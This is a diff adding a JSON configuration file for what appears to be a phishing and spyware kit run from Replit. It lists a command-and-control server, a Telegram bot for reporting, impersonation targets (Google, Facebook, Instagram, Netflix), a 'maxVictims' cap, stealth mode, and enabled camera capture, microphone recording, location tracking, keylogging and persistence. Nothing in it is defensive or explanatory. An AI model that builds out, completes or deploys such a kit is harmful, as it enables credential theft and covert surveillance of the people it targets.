@@ -1,0 +1,49 @@
+{
+  "botToken": "YOUR_BOT_TOKEN_HERE",
+  "adminChatId": "YOUR_CHAT_ID_HERE",
+  "domain": "https://${REPL_SLUG}.${REPL_OWNER}.repl.co",
+  "ports": [3000],
+  "c2Servers": [
+    "https://${REPL_SLUG}.${REPL_OWNER}.repl.co"
+  ],
+  "webhooks": [],
+  "targetWebsites": [
+    {
+      "name": "Google",
+      "url": "https://google.com",
+      "icon": "google.png"
+    },
+    {
+      "name": "Facebook", 
+      "url": "https://facebook.com",
+      "icon": "facebook.png"
+    },
+    {
+      "name": "Instagram",
+      "url": "https://instagram.com", 
+      "icon": "instagram.png"
+    },
+    {
+      "name": "Netflix",
+      "url": "https://netflix.com",
+      "icon": "netflix.png"
+    }
+  ],
+  "encryptionKey": "ultimate-replit-encryption-key-256bit-v5",
+  "autoUpdate": true,
+  "stealthMode": true,
+  "maxVictims": 1000,
+  "dataRetentionDays": 7,
+  "rateLimit": {
+    "windowMs": 60000,
+    "maxRequests": 100
+  },
+  "features": {
+    "cameraCapture": true,
+    "microphoneRecord": true,
+    "locationTracking": true,
+    "keylogging": true,
+    "fileStealing": false,
+    "persistence": true
+  }
+}
